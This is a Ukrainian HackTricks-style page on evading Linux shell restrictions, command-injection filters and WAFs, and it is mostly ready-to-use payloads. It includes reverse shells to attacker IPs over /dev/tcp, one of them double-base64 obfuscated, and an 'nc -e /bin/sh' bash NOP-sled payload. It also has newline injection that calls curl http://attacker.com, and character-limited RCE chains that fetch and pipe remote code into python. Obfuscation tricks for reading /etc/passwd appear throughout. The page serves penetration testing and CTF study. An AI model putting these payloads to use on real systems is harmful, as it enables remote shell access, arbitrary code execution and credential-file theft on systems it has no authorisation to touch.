# Обхід обмежень Linux

{{#include ../../../banners/hacktricks-training.md}}

## Обхід типових обмежень

Збірки command-injection і WAF-evasion у PayloadsAllTheThings, шпаргалка Bo0oM і дві статті Secjuice за посиланнями містять довідкову інформацію про варіанти синтаксису shell, описані в цьому розділі.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>

Щоб виявити точку виклику shell і підтвердити сліпе виконання, див. [Command Injection](../../../pentesting-web/command-injection.md).

### Reverse Shell

```bash
# Double-Base64 payload
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

### Короткий Rev shell

```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```

### Bypass-шляхи та заборонені слова

```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```

### Обхід заборонених пробілів

```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```

### Обхід бекслешу та слешу

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Обхід каналів

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### Обхід за допомогою hex-кодування

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

### Назви команд без літер із використанням вісімкового екранування

Кавування ANSI-C `$'...'` у Bash декодує вісімкові escape-послідовності під час формування слова команди.<sup>[[7]](#references)</sup>

Тому список заборонених літер може виявитися неефективним, якщо він усе ще дозволяє `$`, одинарні лапки, зворотні скісні риски, цифри та роздільник команд. Це не обходить фільтр для вводу, переданого як належно взятий у лапки аргумент-дані.<sup>[[13]](#references)</sup>

У цьому локальному тесті `:` замінює попередню команду, а `\151\144` декодується в `id`.<sup>[[7]](#references)</sup> Якщо доступний роздільник слів, аргументи можна закодувати як окремі слова.<sup>[[13]](#references)</sup>

```bash
:;$'\151\144'
```

### Bypass IPs

```bash
# Decimal IPs
127.0.0.1 == 2130706433
```

### Ексфільтрація даних на основі часу

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### Отримання символів зі змінних середовища

```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```

### Виведення даних через DNS

Для позасмугових зворотних викликів сервіс на кшталт Burp Collaborator, що працює за принципом collaborator, може змусити цільовий застосунок взаємодіяти із зовнішнім сервером; наявне посилання [**pingb**](http://pingb.in) збережено як історичну навігацію, а не як твердження про його поточну доступність.<sup>[[6]](#references)</sup>

### Вбудовані команди

В обмеженій оболонці доступні вбудовані команди — це решта команд, які можна використовувати в цих прикладах; Bash описує свої вбудовані команди та граматику виконання.<sup>[[7]](#references)</sup> Ідея від [**devploit**](https://twitter.com/devploit).\
Спершу перейдіть за наявним посиланням [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), а потім спробуйте наведені нижче специфічні для Bash техніки:<sup>[[7]](#references)</sup>

```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```

### Поліглотна ін'єкція команд

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### Обхід потенційних регулярних виразів

```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```

### Bashfuscator

У наведеному нижче виклику використовується Bashfuscator — фреймворк для обфускації Bash із відкритим вихідним кодом; посилання на репозиторій у коментарі коду залишено для навігації.<sup>[[8]](#references)</sup>

```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```

### RCE за допомогою 5 символів

Наведені нижче два історичні приклади з 5 символами збережено як відтворення завдань: основний репозиторій завдання доступний у [репозиторії Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), а друге посилання на write-up у блоці коду є навігаційним; його поточну доступність не перевіряли.<sup>[[9]](#references)</sup>

```bash
# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Orange Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```

### RCE за допомогою 4 символів

```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```

## Обхід обмежень Read-Only/Noexec/Distroless

Якщо ви перебуваєте у файловій системі із захистом **read-only та noexec** або в **distroless-образі**, середовище накладає обмеження на виконання, описані в Linux `mount(8)` та проєкті Distroless; на пов’язаній сторінці зібрано методи роботи в цих умовах.<sup>[[11]](#references)[[12]](#references)</sup>

{{#ref}}
bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

## Обхід Chroot та інших Jail

{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

## NOP-слайд для Bash на основі пробілів («Bashsledding»)

Якщо вразливість дає змогу частково контролювати аргумент, який зрештою передається до `system()` або іншої оболонки, зміщення payload може бути невідомим. Alan Cao і Will Tan описують обмежений сценарій із вбудованим пристроєм, де payload оболонки розпилювали в пам’ять NVRAM, відображену у пам’ять, і додавали на початок пробіли.<sup>[[5]](#references)</sup>

Отже, можна створити *NOP-слайд для Bash*, додавши перед справжньою командою довгу послідовність пробілів або символів табуляції; Bash визначає пробіли й табуляції як роздільники слів у простій команді.<sup>[[5]](#references)[[7]](#references)</sup>

```bash
# Payload sprayed into an environment variable / NVRAM entry
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× spaces ───┘ ↑ real command
```

Якщо ROP chain (або інший примітив пошкодження пам’яті) передає вказівник на рядок команди, який починається будь-де всередині блоку пробілів, Bash може обробляти решту початкових пробілів, доки не дійде до команди; у наведеному експлойті маршрутизатора це дозволило використовувати рядки з невизначеними зміщеннями.<sup>[[5]](#references)[[7]](#references)</sup>

Практичні випадки використання на вбудованих пристроях з обмеженими ресурсами включають:<sup>[[5]](#references)</sup>

1. **Блоби конфігурації, відображені в пам’ять** (наприклад, NVRAM), доступні з різних процесів.<sup>[[5]](#references)</sup>
2. Канали для payload, у які зловмисник не може записати байти NULL для вирівнювання payload (загальна адаптація проблеми вирівнювання).<sup>[[5]](#references)</sup>
3. Вбудовані пристрої з невеликим середовищем BusyBox `ash`/`sh`, які BusyBox документує як аплети для систем з обмеженими ресурсами.<sup>[[10]](#references)</sup>

> 🛠️  Поєднуйте цю техніку з ROP gadgets, які викликають `system()`, у контрольованій лабораторії; у наведеному дослідженні маршрутизатора продемонстровано таке поєднання на апаратному забезпеченні з обмеженими ресурсами.<sup>[[5]](#references)</sup>



## References

- [1] [PayloadsAllTheThings - Ін’єкція команд](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
- [2] [Bo0oM - Шпаргалка з обходу WAF](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [3] [Техніки обходу Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
- [4] [Техніки обходу Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
- [5] [Alan Cao і Will Tan — Експлуатація zero-day у закинутому обладнанні – блог Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [7] [bash(1) — сторінка довідника Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
- [11] [mount(8) — сторінка довідника Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
- [13] [Dojo CTF #36: опис Shell Escape — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
{{#include ../../../banners/hacktricks-training.md}}
